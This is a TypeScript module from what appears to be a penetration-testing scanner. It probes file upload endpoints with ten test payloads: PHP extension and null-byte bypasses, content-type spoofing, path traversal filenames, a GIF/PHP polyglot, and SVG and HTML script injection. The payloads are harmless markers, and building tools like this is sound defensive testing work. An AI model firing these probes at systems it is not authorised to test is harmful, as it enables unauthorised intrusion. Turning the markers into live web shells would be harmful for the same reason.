/**
 * Scanner: file upload tester
 *
 * Tests file upload endpoints for bypass vulnerabilities: extension bypass,
 * content-type spoofing, path traversal in filename, polyglot files.
 */

import { httpRequest } from "../http-client"
import type { SessionID } from "../../session/schema"

export interface UploadResult {
  vulnerable: boolean
  findings: UploadFinding[]
  testedCount: number
}

export interface UploadFinding {
  technique: string
  filename: string
  contentType: string
  status: number
  evidence: string
  severity: "critical" | "high" | "medium"
}

interface UploadTest {
  technique: string
  filename: string
  contentType: string
  body: string
  severity: "critical" | "high" | "medium"
}

const UPLOAD_TESTS: UploadTest[] = [
  // Extension bypass
  {
    technique: "PHP extension bypass (.php5)",
    filename: "test.php5",
    contentType: "image/jpeg",
    body: "<?php echo 'numasec'; ?>",
    severity: "critical",
  },
  {
    technique: "PHP extension bypass (.phtml)",
    filename: "test.phtml",
    contentType: "image/jpeg",
    body: "<?php echo 'numasec'; ?>",
    severity: "critical",
  },
  {
    technique: "Double extension (.jpg.php)",
    filename: "test.jpg.php",
    contentType: "image/jpeg",
    body: "<?php echo 'numasec'; ?>",
    severity: "critical",
  },
  {
    technique: "Null byte extension (.php%00.jpg)",
    filename: "test.php%00.jpg",
    contentType: "image/jpeg",
    body: "<?php echo 'numasec'; ?>",
    severity: "critical",
  },
  // Content-type spoofing
  {
    technique: "Content-type spoofing (application/x-httpd-php)",
    filename: "test.jpg",
    contentType: "application/x-httpd-php",
    body: "<?php echo 'numasec'; ?>",
    severity: "high",
  },
  // Path traversal in filename
  {
    technique: "Path traversal in filename",
    filename: "../../../tmp/numasec_test.txt",
    contentType: "text/plain",
    body: "numasec path traversal test",
    severity: "critical",
  },
  {
    technique: "Path traversal (backslash)",
    filename: "..\\..\\..\\tmp\\numasec_test.txt",
    contentType: "text/plain",
    body: "numasec path traversal test",
    severity: "critical",
  },
  // Polyglot files
  {
    technique: "GIF polyglot with PHP",
    filename: "test.gif",
    contentType: "image/gif",
    body: "GIF89a<?php echo 'numasec'; ?>",
    severity: "high",
  },
  // SVG with XSS
  {
    technique: "SVG with embedded JavaScript",
    filename: "test.svg",
    contentType: "image/svg+xml",
    body: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("numasec")</script></svg>',
    severity: "high",
  },
  // HTML upload
  {
    technique: "HTML file upload (stored XSS)",
    filename: "test.html",
    contentType: "text/html",
    body: '<html><body><script>alert("numasec")</script></body></html>',
    severity: "medium",
  },
]

function buildMultipartBody(
  fieldName: string,
  filename: string,
  contentType: string,
  fileContent: string,
): { body: string; boundary: string } {
  const boundary = `----numasec${Date.now()}`
  const body = [
    `--${boundary}`,
    `Content-Disposition: form-data; name="${fieldName}"; filename="${filename}"`,
    `Content-Type: ${contentType}`,
    "",
    fileContent,
    `--${boundary}--`,
  ].join("\r\n")
  return { body, boundary }
}

/**
 * Test a file upload endpoint for bypass vulnerabilities.
 */
export async function testUpload(
  url: string,
  options: {
    fieldName?: string
    method?: string
    headers?: Record<string, string>
    cookies?: string
    timeout?: number
    sessionID?: SessionID | string
  } = {},
): Promise<UploadResult> {
  const { fieldName = "file", method = "POST", headers = {}, cookies, timeout = 15_000, sessionID } = options
  const findings: UploadFinding[] = []

  for (const test of UPLOAD_TESTS) {
    const { body, boundary } = buildMultipartBody(fieldName, test.filename, test.contentType, test.body)

    const resp = await httpRequest(url, {
      method,
      headers: {
        ...headers,
        "Content-Type": `multipart/form-data; boundary=${boundary}`,
      },
      body,
      cookies,
      timeout,
      sessionID,
    })

    // Check for accepted upload (200/201/204 without error indicators)
    if (resp.status >= 200 && resp.status < 300) {
      const lower = resp.body.toLowerCase()
      const hasError = lower.includes("error") || lower.includes("not allowed") || lower.includes("rejected") || lower.includes("invalid")

      if (!hasError) {
        findings.push({
          technique: test.technique,
          filename: test.filename,
          contentType: test.contentType,
          status: resp.status,
          evidence: `Upload accepted (${resp.status}). Response: ${resp.body.slice(0, 200)}`,
          severity: test.severity,
        })
      }
    }
  }

  return {
    vulnerable: findings.length > 0,
    findings,
    testedCount: UPLOAD_TESTS.length,
  }
}
